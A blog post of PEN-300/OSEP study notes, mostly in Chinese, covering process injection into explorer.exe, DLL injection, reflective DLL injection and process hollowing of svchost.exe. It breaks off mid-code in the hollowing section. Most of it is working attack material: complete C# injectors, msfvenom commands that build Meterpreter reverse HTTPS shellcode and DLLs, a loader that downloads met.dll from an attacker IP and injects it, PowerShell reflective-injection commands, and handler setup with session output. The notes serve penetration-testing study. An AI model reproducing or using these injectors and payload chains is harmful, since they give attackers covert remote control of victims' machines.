---
title: "[OSEP, PEN-300] Instructional notes - Part 3"
date: 2026-08-11
author: "CHW"
tags:
  - offsec
description: "OSWE PEN-300 筆記 Part 3，整理 Process Injection、DLL Injection、Reflective DLL Injection、Process Hollowing、Antivirus Evasion、VBA Macro、PowerShell 與 Windows API 規避技術等等。"
---

[OSEP, PEN-300] Instructional notes - Part 3
===

# Table of Contents
[TOC]

# [Link back to: "[OSEP, PEN-300] Instructional notes - Part 1"](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-1/)
# [Link back to: "[OSEP, PEN-300] Instructional notes - Part 2"](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-2/)
>[!Caution]
> 接續 [[OSEP, PEN-300] Instructional notes - Part 2](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-2/) 內容

# Process Injection and Migration
為什麼要把 shellcode 移到另一個 process、需要哪些 Win32 API\
透過手動將 code 注入到其他 programs (Process Injection)

## Finding a Home for Our Shellcode

### Process Injection and Migration Theory
一般 shellcode runner 會在啟動它的 process 中執行，🥚 原本的 application 若被關閉或 process 行為異常 (EDR 可能判定異常)

透過 Win32 [OpenProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) API 開啟一個 process 與 process 之間的通道，從而啟動  Windows-based process 注入。\
接著透過 [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) 和 [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) API 修改記憶體空間，最後 [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) 在 remote process 中建立一個新的 thread
```
目前 process
    │
    │ OpenProcess
    ▼
取得目標 process handle
    │
    │ VirtualAllocEx
    ▼
在目標 process 配置記憶體
    │
    │ WriteProcessMemory
    ▼
將 shellcode 寫進目標 process
    │
    │ CreateRemoteThread
    ▼
在目標 process 中執行 shellcode
```
- OpenProcess
OpenProcess 用來取得目標 process 的 handle
```csharp
HANDLE OpenProcess(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId
);
```
> - `dwDesiredAccess`: 要求的 process 權限
> - `bInheritHandle`: child process 是否可繼承 handle
> - `dwProcessId`: 目標 process PID

- dwDesiredAccess
dwDesiredAccess 決定你想對目標 process 做什麼\
Process injection 通常需要的權限包括
```csharp
PROCESS_CREATE_THREAD
PROCESS_QUERY_INFORMATION
PROCESS_VM_OPERATION
PROCESS_VM_WRITE
PROCESS_VM_READ
```
> ⚠️ 請求的權限越高越容易被安全產品注意

每個 process 都有 Security Descriptor，定義可以執行哪些操作、Read、Write、Query、Termnate、Create Thread、修改記憶體\
![image](https://hackmd.io/_uploads/H15z-5BHGl.png)

在 Process Explorer 查看 Notepad Properties\
![image](https://hackmd.io/_uploads/HkUu-qBHfg.png)
> 是一般 Medium Integrity level

點擊 Permission 可以查看使用者權限
![image](https://hackmd.io/_uploads/BkH-f5HBGe.png)
> 可以得知當前 offsec user 有權限讀寫 process

📒：若以 Run as administrator 開啟，權限會變成 High Integrity level\
![image](https://hackmd.io/_uploads/rkPFfqrHGl.png)

>[!Tip]
>若使用 Word macro 或 Jscript file 來源若仍為普通 Word ，會造成 OpenProcess 失敗\
>(低 Integrity process 通常不能修改高 Integrity process)

同時確保使用者登入後一定存在的 process，生命週期長
👉🏻 選 `explorer.exe` 也是常見的 injection target

### Process Injection in C\#
🎯：程把 shellcode 寫入 explorer.exe 的記憶體，在 explorer.exe 裡建立遠端 thread

在 Visual Studio 新建一個 .NET standard Console App
![image](https://hackmd.io/_uploads/HkbNVorHfl.png)

四個必需的 API:
#### 1. OpenProcess
在 www.pinvoke.net 上搜尋 P/Invoke OpenProcess DllImport statement
把 DllImport 語句複製到 Program class 中，並加入「using」語句來引用 System.Runtime.InteropServices namespace
```csharp
using System;
using System.Runtime.InteropServices;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        
        static void Main(string[] args)
        {
        }
    }
}
```
從 [function prototype](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) 可以找到  OpenProcess function API's arguments
```csharp
HANDLE OpenProcess(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);
```
> - `dwDesiredAccess`: 要求的 process 權限
> - `bInheritHandle	child process`: 是否可繼承 handle
> - `dwProcessId`: 目標 process PID

```csharp
IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4160);
```
#### 3. VirtualAllocEx
需要使用 VirtualAllocEx 為 shellcode 分配 memory
```csharp
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocEx(
    IntPtr hProcess,
    IntPtr lpAddress,
    uint dwSize,
    uint flAllocationType,
    uint flProtect
);
```
>[!Tip]
> - VirtualAlloc → 在目前 process 配置記憶體
> - VirtualAllocEx → 在指定的遠端 process 配置記憶體

VirtualAllocEx arguments [function prototype](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
```csharp
LPVOID VirtualAllocEx(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
```
```csharp
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
```
> - `hProcess`: explorer.exe handle
> - `IntPtr.Zero`: 由 Windows 選擇未使用地址
> - `0x1000`: 4096 bytes
> - `0x3000`: MEM_COMMIT | MEM_RESERVE
> - `0x40`: PAGE_EXECUTE_READWRITE

分配記憶體後，接著會使用 msfvenom 產生 64-bit Meterpreter staged shellcode (C#)，並將其嵌入到程式碼中

#### 3. WriteProcessMemory
寫入記憶體利用 WriteProcessMemory 
```csharp
[DllImport("kernel32.dll", SetLastError = true)]
static extern bool WriteProcessMemory(
    IntPtr hProcess,
    IntPtr lpBaseAddress,
    byte[] lpBuffer,
    int nSize,
    out IntPtr lpNumberOfBytesWritten
);
```
WriteProcessMemory arguments [function prototype](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
```csharp
BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
```
> 本地 C# byte[] buf → 寫入 explorer.exe 的 addr
```csharp
byte[] buf = new byte[626] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc...

IntPtr outSize;
WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
```
> 將本地 C# byte[] buf 寫入 explorer.exe 的 addr

#### 4. CreateRemoteThread
最後將可執行 shellcode 導入 CreateRemoteThread
```csharp
[DllImport("kernel32.dll", SetLastError = true)]
static extern IntPtr CreateRemoteThread(
    IntPtr hProcess,
    IntPtr lpThreadAttributes,
    uint dwStackSize,
    IntPtr lpStartAddress,
    IntPtr lpParameter,
    uint dwCreationFlags,
    IntPtr lpThreadId
);
```
CreateRemoteThread arguments [function prototype](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
```csharp
HANDLE CreateRemoteThread(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);
```
```csharp
IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```
> `addr`是前面寫入 payload 的遠端記憶體位置\
> CreateRemoteThread\
> → 在 explorer.exe 建立新 thread\
> → instruction pointer 從 addr 開始

(Kali)
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<KALI-IP> LPORT=443 EXITFUNC=thread -f csharp -o shellcode.txt
```
Review 完整 code:
```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Inject
{
    class Program
    {
        [DllImport(
            "kernel32.dll",
            SetLastError = true,
            ExactSpelling = true
        )]
        static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId
        );

        [DllImport(
            "kernel32.dll",
            SetLastError = true,
            ExactSpelling = true
        )]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect
        );

        [DllImport(
            "kernel32.dll",
            SetLastError = true
        )]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten
        );

        [DllImport(
            "kernel32.dll",
            SetLastError = true
        )]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId
        );

        static void Main(string[] args)
        {
            byte[] buf =
            {
                // 完整 byte array
            };

            if (buf.Length == 0)
            {
                Console.WriteLine("Shellcode buffer is empty.");
                return;
            }

            Process[] explorers =
                Process.GetProcessesByName("explorer");

            if (explorers.Length == 0)
            {
                Console.WriteLine(
                    "explorer.exe not found."
                );

                return;
            }

            int pid = explorers[0].Id;

            Console.WriteLine(
                $"Target PID: {pid}"
            );

            IntPtr hProcess = OpenProcess(
                0x001F0FFF,
                false,
                pid
            );

            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine(
                    "OpenProcess failed: " +
                    Marshal.GetLastWin32Error()
                );

                return;
            }

            IntPtr addr = VirtualAllocEx(
                hProcess,
                IntPtr.Zero,
                (uint)buf.Length,
                0x3000,
                0x40
            );

            if (addr == IntPtr.Zero)
            {
                Console.WriteLine(
                    "VirtualAllocEx failed: " +
                    Marshal.GetLastWin32Error()
                );

                return;
            }

            bool written = WriteProcessMemory(
                hProcess,
                addr,
                buf,
                buf.Length,
                out IntPtr outSize
            );

            if (!written)
            {
                Console.WriteLine(
                    "WriteProcessMemory failed: " +
                    Marshal.GetLastWin32Error()
                );

                return;
            }

            Console.WriteLine(
                $"Bytes written: {outSize.ToInt64()}"
            );

            IntPtr hThread = CreateRemoteThread(
                hProcess,
                IntPtr.Zero,
                0,
                addr,
                IntPtr.Zero,
                0,
                IntPtr.Zero
            );

            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine(
                    "CreateRemoteThread failed: " +
                    Marshal.GetLastWin32Error()
                );

                return;
            }

            Console.WriteLine(
                "Remote thread created successfully."
            );
        }
    }
}
```
![image](https://hackmd.io/_uploads/r19xfRBHMe.png)\
![image](https://hackmd.io/_uploads/ryuZgCrSMe.png)

## DLL Injection
上述注入的是 shellcode bytes，將 shellcode 改成讓 remote process 載入一整個 unmanaged DLL
```
OpenProcess
→ VirtualAllocEx
→ WriteProcessMemory（寫入 DLL 路徑）
→ 解析 LoadLibraryA 位址
→ CreateRemoteThread
→ 遠端 process 執行 LoadLibraryA
→ 載入 DLL
→ 自動呼叫 DLL 的 DllMain
```

### DLL Injection Theory
當一個 process 需要使用 DLL 的 API 時，它會呼叫 [LoadLibrary](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) API 將 DLL 載入到虛擬記憶體空間，🥚 LoadLibrary 不能被 remote process invoked，因此需要像上述 explorer.exe 的方式載入 DLL

LoadLibrary arguments [function prototype](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)
```csharp
HMODULE LoadLibraryA(
  LPCSTR lpLibFileName
);
```
> 只有一個參數：DLL 的完整路徑

因此需要先在 explorer.exe 裡 VirtualAllocEx 配置一塊記憶體，接著 WriteProcessMemory 寫入 "C:\Tools\payload.dll\0"\
最後將 addr 交給 `CreateRemoteThread(..., lpParameter)`
(⚠️: managed C# DLL 不能直接用 LoadLibrary 載入一般 unmanaged process)

>[!Note]
>Windows API 常有兩個版本:
>- LoadLibraryA: ANSI
>- LoadLibraryW: Unicode / UTF-16

Native DLL 的入口通常是 DllMain
```csharp
BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason,
    LPVOID lpvReserved
);
```
當 DLL 被載入時，Windows 會呼叫 DllMain 傳入 reason code，常見 DLL_PROCESS_ATTACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH, DLL_PROCESS_DETACH

DllMain 會根據 reason code (fdwReason) 參數執行不同的操作，當 process 因為 LoadLibrary 載入 DLL 時，會呼叫 `DllMain(..., DLL_PROCESS_ATTACH, ...)`因此可以將初始化程式放在 `case DLL_PROCESS_ATTACH`
```csharp
BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
完整 DLL Injection 流程：
```
1. 取得 explorer.exe PID
2. OpenProcess
3. 準備 DLL 完整路徑
4. VirtualAllocEx 配置遠端字串空間
5. WriteProcessMemory 寫入 DLL 路徑
6. 找到 LoadLibraryA 位址
7. CreateRemoteThread
   - start address = LoadLibraryA
   - parameter = DLL 路徑位址
8. explorer.exe 呼叫 LoadLibraryA
9. DLL 被載入
10. Windows 呼叫 DllMain
11. DLL_PROCESS_ATTACH 內容執行
```

### DLL Injection with C\#
結合 DLL Injection 理論作成實際 Workflow
#### 1. 產生 DLL
```
┌──(chw💲CHW)-[~]
└─$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<KALI_IP> LPORT=443 EXITFUNC=thread -f dll -o /var/www/html/met.dll
```
![image](https://hackmd.io/_uploads/ry5kEJPBze.png)

確認 Apache：
```
sudo systemctl enable --now apache2
```
![image](https://hackmd.io/_uploads/SkgWzgPHGl.png)

#### 2. 下載 DLL 到 Windows 並寫入遠端 process

完整 DLL injection code:
```csharp
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace Inject
{
    internal class Program
    {
        private const uint PROCESS_ALL_ACCESS = 0x001F0FFF;

        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;

        private const uint PAGE_READWRITE = 0x04;

        [DllImport(
            "kernel32.dll",
            SetLastError = true,
            ExactSpelling = true
        )]
        private static extern IntPtr OpenProcess(
            uint processAccess,
            bool inheritHandle,
            int processId
        );

        [DllImport(
            "kernel32.dll",
            SetLastError = true,
            ExactSpelling = true
        )]
        private static extern IntPtr VirtualAllocEx(
            IntPtr processHandle,
            IntPtr address,
            uint size,
            uint allocationType,
            uint protection
        );

        [DllImport(
            "kernel32.dll",
            SetLastError = true
        )]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool WriteProcessMemory(
            IntPtr processHandle,
            IntPtr baseAddress,
            byte[] buffer,
            int size,
            out IntPtr bytesWritten
        );

        [DllImport(
            "kernel32.dll",
            SetLastError = true
        )]
        private static extern IntPtr CreateRemoteThread(
            IntPtr processHandle,
            IntPtr threadAttributes,
            uint stackSize,
            IntPtr startAddress,
            IntPtr parameter,
            uint creationFlags,
            IntPtr threadId
        );

        [DllImport(
            "kernel32.dll",
            CharSet = CharSet.Ansi,
            ExactSpelling = true,
            SetLastError = true
        )]
        private static extern IntPtr GetProcAddress(
            IntPtr moduleHandle,
            string procName
        );

        [DllImport(
            "kernel32.dll",
            CharSet = CharSet.Auto,
            SetLastError = true
        )]
        private static extern IntPtr GetModuleHandle(
            string moduleName
        );

        [DllImport(
            "kernel32.dll",
            SetLastError = true
        )]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle(
            IntPtr handle
        );

        private static void Main()
        {
            string kaliIp = "192.168.45.187";

            string directory =
                Environment.GetFolderPath(
                    Environment.SpecialFolder.MyDocuments
                );

            string dllName =
                System.IO.Path.Combine(
                    directory,
                    "met.dll"
                );

            string dllUrl =
                $"http://{kaliIp}/met.dll";

            Console.WriteLine(
                $"[*] Downloading: {dllUrl}"
            );

            Console.WriteLine(
                $"[*] Destination: {dllName}"
            );

            using (WebClient webClient = new WebClient())
            {
                webClient.DownloadFile(
                    dllUrl,
                    dllName
                );
            }

            if (!System.IO.File.Exists(dllName))
            {
                Console.WriteLine(
                    "[-] DLL download failed."
                );

                return;
            }

            Process[] explorerProcesses =
                Process.GetProcessesByName(
                    "explorer"
                );

            if (explorerProcesses.Length == 0)
            {
                Console.WriteLine(
                    "[-] explorer.exe not found."
                );

                return;
            }

            int pid =
                explorerProcesses[0].Id;

            Console.WriteLine(
                $"[+] explorer.exe PID: {pid}"
            );

            IntPtr processHandle = OpenProcess(
                PROCESS_ALL_ACCESS,
                false,
                pid
            );

            if (processHandle == IntPtr.Zero)
            {
                PrintLastError(
                    "OpenProcess"
                );

                return;
            }

            try
            {
                byte[] dllPathBytes =
                    Encoding.ASCII.GetBytes(
                        dllName + "\0"
                    );

                IntPtr remoteAddress =
                    VirtualAllocEx(
                        processHandle,
                        IntPtr.Zero,
                        (uint)dllPathBytes.Length,
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_READWRITE
                    );

                if (remoteAddress == IntPtr.Zero)
                {
                    PrintLastError(
                        "VirtualAllocEx"
                    );

                    return;
                }

                Console.WriteLine(
                    $"[+] Remote buffer: " +
                    $"0x{remoteAddress.ToInt64():X}"
                );

                bool writeResult =
                    WriteProcessMemory(
                        processHandle,
                        remoteAddress,
                        dllPathBytes,
                        dllPathBytes.Length,
                        out IntPtr bytesWritten
                    );

                if (!writeResult)
                {
                    PrintLastError(
                        "WriteProcessMemory"
                    );

                    return;
                }

                Console.WriteLine(
                    $"[+] Wrote {bytesWritten.ToInt64()} bytes"
                );

                IntPtr kernel32 =
                    GetModuleHandle(
                        "kernel32.dll"
                    );

                if (kernel32 == IntPtr.Zero)
                {
                    PrintLastError(
                        "GetModuleHandle"
                    );

                    return;
                }

                IntPtr loadLibraryAddress =
                    GetProcAddress(
                        kernel32,
                        "LoadLibraryA"
                    );

                if (loadLibraryAddress == IntPtr.Zero)
                {
                    PrintLastError(
                        "GetProcAddress"
                    );

                    return;
                }

                Console.WriteLine(
                    $"[+] LoadLibraryA: " +
                    $"0x{loadLibraryAddress.ToInt64():X}"
                );

                IntPtr threadHandle =
                    CreateRemoteThread(
                        processHandle,
                        IntPtr.Zero,
                        0,
                        loadLibraryAddress,
                        remoteAddress,
                        0,
                        IntPtr.Zero
                    );

                if (threadHandle == IntPtr.Zero)
                {
                    PrintLastError(
                        "CreateRemoteThread"
                    );

                    return;
                }

                try
                {
                    Console.WriteLine(
                        "[+] Remote thread created."
                    );

                    Console.WriteLine(
                        "[+] DLL injection request completed."
                    );
                }
                finally
                {
                    CloseHandle(threadHandle);
                }
            }
            finally
            {
                CloseHandle(processHandle);
            }
        }

        private static void PrintLastError(
            string functionName
        )
        {
            int error =
                Marshal.GetLastWin32Error();

            Console.WriteLine(
                $"[-] {functionName} failed. " +
                $"Win32 error: {error}"
            );
        }
    }
}
```

#### 3. Kali Handler
(Kali)
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST <KALI-IP>
set LPORT 443
set ExitOnSession false
run
```
可以使用 Process Explorer 檢視 loaded DLLs processes\
View > Lower Pane View 選擇 explorer.exe process 可以找到 met.dll

![image](https://hackmd.io/_uploads/H1d4UGDBGl.png)

## Reflective DLL Injection
### Reflective DLL Injection in PowerShell
透過 met.dll → 先下載到 Windows 磁碟 → LoadLibraryA 載入\
Reflective DLL Injection 可以進化成利用 DLL's [Portable Executable](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format) (PE) file，不會落地 disk：
```
met.dll
→ DLL 進入 byte[]
→ 手動解析 PE headers
→ 配置記憶體
→ 複製 sections
→ 修正 relocations
→ 解析 imports
→ 設定 memory protection
→ 呼叫 DLL entry point
```

Security researchers Joe Bialek 和 Matt Graeber 開發 [Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1) 的 PowerShell reflective DLL injection code

```powershell
PS C:\Users\offsec> PowerShell -Exec Bypass

PS C:\Users\offsec> $bytes = (New-Object System.Net.WebClient).DownloadData('http://<KALI_IP>/met.dll')

PS C:\Users\offsec> $procid = (Get-Process -Name explorer).Id
```
先用 Import-Module 從 `C:\Tools` 匯入 Invoke-ReflectivePEInjection
```powershell
PS C:\Users\offsec> Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
```

提供 byte array（`-PEBytes`）和 process ID（`-ProcId`）來執行 script
```powershell
PS C:\Users\offsec> Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

最後用 Kali reverse Meterpreter 取得 Shell
```bash
msf5 exploit(multi/handler) > exploit

[*] Started HTTPS reverse handler on https://192.168.119.120:443
[*] https://192.168.119.120:443 handling request from 192.168.120.11; (UUID: pm1qmw8u) Staging x64 payload (207449 bytes) ...
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.11:49678)

meterpreter > 
```

## Process Hollowing
將程式碼 injecti 到 explorer.exe 或 notepad.exe 等 process\
但因為我們會 generating network activity 
🤔 notepad 突然對外連線 (超級奇怪)\
改利用 svchost.exe

>[!Note]
>所有 svchost.exe process 預設都以 SYSTEM SYSTEM integrity level 運行\
>因此無法從 lower integrity level 注入。BTW 如果啟動 svchost.exe並嘗試注入，該 process 會直接終止

🎯 啟動一個 svchost.exe 並在開始執行前對其進行修改

### Process Hollowing Theory
Process Hollowing 不需要在既有 process 裡另外建立 remote thread，而是修改新建立 process 原本主 thread 即將執行的位置
```
建立一個暫停狀態的新 process
→ 找到原本的 EntryPoint
→ 用 shellcode 覆蓋 EntryPoint
→ 恢復主 thread
→ process 從 shellcode 開始執行
```

建立 process 時需使用 [CREATE_SUSPENDED](https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags) flag，流程會停在 "主 thread 已建立但尚未執行 EXE 指令時"，就能修改 EntryPoint

在 CreateProcess API 建立 process 時，OS 會有三個動作：
1. 為新 process 建立 virtual memory space
2. 分配 stack along with [Thread Environment Block](https://en.wikipedia.org/wiki/Win32_Thread_Information_Block) (TEB) 和 [Process Environment Block](https://en.wikipedia.org/wiki/Process_Environment_Block) (PEB)
3. 將所需的 DLL 和 EXE 載入到記憶體

以上 tasks 完成後，OS 會建立一個 thread 來執行 code

>[!Important]
>找到可執行檔的 EntryPoint 用預先準備好的 shellcode 覆蓋其記憶體中內容，🥚\
>⚠️ [Address space layout randomization (ASLR)](https://en.wikipedia.org/wiki/Address_space_layout_randomization) 會改變 executable 載入的 base address\
>不能直接 hardcode EntryPoint\
>必須先找到: `實際 Image Base` + `AddressOfEntryPoint RVA`

從 ZwQueryInformationProcess API 的 PEB addr 中，可以取得 process 的 base address ，進而解析 PE headers 並定位 EntryPoint

#### - 從 PEB 取得 Image Base
透過 ZwQueryInformationProcess 取得遠端 process 的 PEB address\
👉🏻 x64 `PEB + 0x10` 存放 executable 的 Image Base Address

Ex. PEB address = 0x3004000\
Image Base pointer 👉🏻 0x3004000 + 0x10 = 0x3004010\
接著使用 ReadProcessMemory 讀取 0x3004010 的內容

#### - PE Header 定位方式
取得 Image Base 後，要讀取 PE 結構\
PE 開頭為：
```
Offset 0x00：MZ Header
Offset 0x3C：e_lfanew
```
> `e_lfanew` 代表從 Image Base 到 PE Header 的偏移量

👉🏻 PE Header Address = Image Base + e_lfanew\
![image](https://hackmd.io/_uploads/HJcAj_DSMl.png)

#### - EntryPoint RVA
在 PE Header 中 AddressOfEntryPoint 位於 PE Header + 0x28\
要讀取 EntryPoint RVA 的 address
👉🏻 Image Base + e_lfanew + 0x28 (EntryPoint RVA)\
讀取 EntryPoint RVA 後，還要：
👉🏻 👉🏻  EntryPoint Virtual Address = Image Base + EntryPoint RVA

### Process Hollowing with C\#

```
CreateProcess(CREATE_SUSPENDED)
→ ZwQueryInformationProcess
→ 取得 PEB
→ 從 PEB + 0x10 讀出 Image Base
→ 解析 PE Header
→ 算出 AddressOfEntryPoint
→ WriteProcessMemory 覆蓋 EntryPoint
→ ResumeThread
```
將完整實作成 C#

#### 1. CreateProcessW
第一步是建立 suspended 的進程，需要使用 Win32 的 CreateProcessW API
>[!Tip]
>高階 API `Process.Start(...)` 無法建立 suspended process，因此需要呼叫 `CreateProcessW(...)` 並指定 `CREATE_SUSPENDED = 0x4`
>
> 以上前置可以讓 svchost.exe:
> - 建立 process
> - 建立 PEB / TEB
> - 載入 EXE 與 DLL
> - 建立主 thread

```csharp
[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, 
    IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, 
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, 
            [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
```
要匯入 CreateProcessW function，也必須包含 System.Threading namespace，需手動定義：(CreateProcessW [function prototype](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw))
```csharp
BOOL CreateProcessW(
  LPCWSTR               lpApplicationName,
  LPWSTR                lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCWSTR               lpCurrentDirectory,
  LPSTARTUPINFOW        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);

```

#### 2. STARTUPINFO
接著 [STARTUPINFO](https://docs.microsoft.com/windows/desktop/api/processthreadsapi/ns-processthreadsapi-startupinfoa) structure 用來描述新 process 的視窗與標準輸入輸出資訊：
```csharp
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
struct STARTUPINFO
{
    public uint cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    public uint dwX;
    public uint dwY;
    public uint dwXSize;
    public uint dwYSize;
    public uint dwXCountChars;
    public uint dwYCountChars;
    public uint dwFillAttribute;
    public uint dwFlags;
    public ushort wShowWindow;
    public ushort cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdError;
}
```
使用前要設定：
```csharp
STARTUPINFO si = new STARTUPINFO();
si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
```

#### 3. PROCESS_INFORMATION
CreateProcessW 成功後，Windows 會把新 process 資訊填入 PROCESS_INFORMATION
```csharp
[StructLayout(LayoutKind.Sequential)]
internal struct PROCESS_INFORMATION
{
    public IntPtr hProcess;
    public IntPtr hThread;
    public int dwProcessId;
    public int dwThreadId;
}
```
> - `hProcess`: suspended svchost.exe 的 process handle
> - `hThread`: svchost.exe 主執行緒 handle
> - `dwProcessId`: svchost.exe PID

#### 4. 建立 suspended svchost.exe
instantiating STARTUPINFO 和 PROCESS_INFORMATION object
```csharp
bool created = CreateProcessW(
    null,
    @"C:\Windows\System32\svchost.exe",
    IntPtr.Zero,
    IntPtr.Zero,
    false,
    CREATE_SUSPENDED,
    IntPtr.Zero,
    null,
    ref si,
    out pi
);
```
建立後的程序關係會是 Hollow.exe → svchost.exe（Suspended）

#### 5. 透過 ZwQueryInformationProcess 取得 PEB
定位 EntryPoint: 先透過 ZwQueryInformationProcess 取得 PEB\
再用 P/Invoke 定義 DllImport statement
```csharp
[DllImport("ntdll.dll")]
static extern int ZwQueryInformationProcess(
    IntPtr hProcess,
    int processInformationClass,
    ref PROCESS_BASIC_INFORMATION processInformation,
    uint processInformationLength,
    ref uint returnLength
);
```
>[!Note]
>ZwQueryInformationProcess API 用途 ([fetches the PEB](https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess))
>```csharp
>NTSTATUS WINAPI ZwQueryInformationProcess(
>  _In_      HANDLE           ProcessHandle,
>  _In_      PROCESSINFOCLASS ProcessInformationClass,
>  _Out_     PVOID            ProcessInformation,
>  _In_      ULONG            ProcessInformationLength,
>  _Out_opt_ PULONG           ReturnLength
>);
>```

以上定義 (對應 structure)
```csharp
[StructLayout(LayoutKind.Sequential)]
struct PROCESS_BASIC_INFORMATION
{
    public IntPtr Reserved1;
    public IntPtr PebAddress;
    public IntPtr Reserved2;
    public IntPtr Reserved3;
    public IntPtr UniquePid;
    public IntPtr MoreReserved;
}
```
(呼叫)
```csharp
PROCESS_BASIC_INFORMATION pbi =
    new PROCESS_BASIC_INFORMATION();

uint returnLength = 0;

int status = ZwQueryInformationProcess(
    pi.hProcess,
    0,
    ref pbi,
    (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)),
    ref returnLength
);
```

#### 6. 從 PEB 取得 Image Base
在 x64 process 中，Image Base Address 位於 `PEB + 0x10`
```csharp
IntPtr ptrToImageBase =
    IntPtr.Add(
        pbi.PebAddress,
        0x10
    );
```
再透過 ReadProcessMemory 讀出該位置的 pointer
```csharp
byte[] imageBaseBuffer =
    new byte[IntPtr.Size];

ReadProcessMemory(
    pi.hProcess,
    ptrToImageBase,
    imageBaseBuffer,
    imageBaseBuffer.Length,
    out IntPtr bytesRead
);
```
在 x64 下 IntPtr.Size = 8
```csharp
IntPtr imageBase =
    new IntPtr(
        BitConverter.ToInt64(
            imageBaseBuffer,
